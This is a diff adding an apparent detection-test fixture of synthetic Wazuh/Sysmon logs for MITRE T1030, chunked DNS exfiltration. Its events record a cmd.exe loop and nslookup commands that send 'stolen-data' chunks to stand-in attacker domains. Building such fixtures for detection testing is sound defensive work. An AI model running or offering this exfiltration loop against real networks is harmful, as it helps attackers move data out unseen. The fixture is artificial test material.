@@ -1,0 +1,222 @@
+{
+  "_metadata": {
+    "attack_id": "T1030",
+    "variation": "001",
+    "name": "Chunked DNS Exfiltration",
+    "description": "Chunked data exfiltration via DNS queries with sequential naming to stay under transfer size limits",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "exfiltration",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - nslookup for first chunk of exfiltrated data",
+      "sequence": 1,
+      "timestamp": "2026-02-21T01:05:00.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Suspicious sequential DNS query for data exfiltration",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1030"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Data Transfer Size Limits"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000018.200001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 01:05:00.000",
+              "processGuid": "{a1b2c3d4-1111-4a5b-9c0d-e1f2a3b4c5d6}",
+              "processId": "3412",
+              "image": "C:\\Windows\\System32\\nslookup.exe",
+              "commandLine": "nslookup stolen-data-part1of5.exfil.attacker.com",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=2f3a4b5c6d7e8f901a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f901a2b3c4d5e",
+              "parentProcessGuid": "{a1b2c3d4-1110-4a5b-9c0d-e1f2a3b4c5d6}",
+              "parentProcessId": "7820",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe /c for /L %i in (1,1,5) do nslookup stolen-data-part%iof5.exfil.attacker.com"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 22 - DNS query for second chunk of exfiltrated data",
+      "sequence": 2,
+      "timestamp": "2026-02-21T01:05:05.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 22: Sequential DNS query pattern indicating data exfiltration",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1030"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Data Transfer Size Limits"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event22",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000018.200002",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "22",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "22",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 01:05:05.000",
+              "processGuid": "{a1b2c3d4-1112-4a5b-9c0d-e1f2a3b4c5d6}",
+              "processId": "3418",
+              "image": "C:\\Windows\\System32\\nslookup.exe",
+              "queryName": "stolen-data-part2of5.exfil.attacker.com",
+              "queryStatus": "0",
+              "queryResults": "type:  5 c2-relay.attacker.com",
+              "user": "CORP\\attacker"
+            }
+          }
+        }
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - nslookup for third chunk of exfiltrated data",
+      "sequence": 3,
+      "timestamp": "2026-02-21T01:05:10.000Z",
+      "log": {
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Continued sequential DNS exfiltration pattern",
+          "id": "100100",
+          "mitre": {
+            "id": [
+              "T1030"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Data Transfer Size Limits"
+            ]
+          },
+          "firedtimes": 3,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000018.200003",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-21 01:05:10.000",
+              "processGuid": "{a1b2c3d4-1113-4a5b-9c0d-e1f2a3b4c5d6}",
+              "processId": "3424",
+              "image": "C:\\Windows\\System32\\nslookup.exe",
+              "commandLine": "nslookup stolen-data-part3of5.exfil.attacker.com",
+              "currentDirectory": "C:\\Users\\attacker\\",
+              "user": "CORP\\attacker",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=2f3a4b5c6d7e8f901a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f901a2b3c4d5e",
+              "parentProcessGuid": "{a1b2c3d4-1110-4a5b-9c0d-e1f2a3b4c5d6}",
+              "parentProcessId": "7820",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe /c for /L %i in (1,1,5) do nslookup stolen-data-part%iof5.exfil.attacker.com"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
